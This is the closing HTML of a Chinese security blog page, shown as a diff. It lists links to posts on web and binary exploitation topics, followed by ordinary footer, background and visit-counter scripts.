+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/02/DVWA之JavaScript攻击/">DVWA之JavaScript攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/30/XSS从弹框到RCE/">XSS从弹框到RCE（IE）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/">一道Bypass正则过滤的反序列化漏洞题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/">从一道CTF题看如何通过本地DTD文件利用XXE实现回显</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/25/浅析DOM型XSS/">浅析DOM型XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/09/探讨XXE防御之setFeature设置/">探讨XXE防御之setFeature设置</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/27/堆基础/">堆基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之cve-2017-8046</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/03/栈及栈帧/">栈基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/01/Java反射机制/">Java反射机制</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2019 Mi1k7ea
+            </div>
+            <div class="footer-right">
+                Welcome to M1ik7ea's blog <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style="display:none">
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style="display:none">
+                        <span id="page-visit" title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 4;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
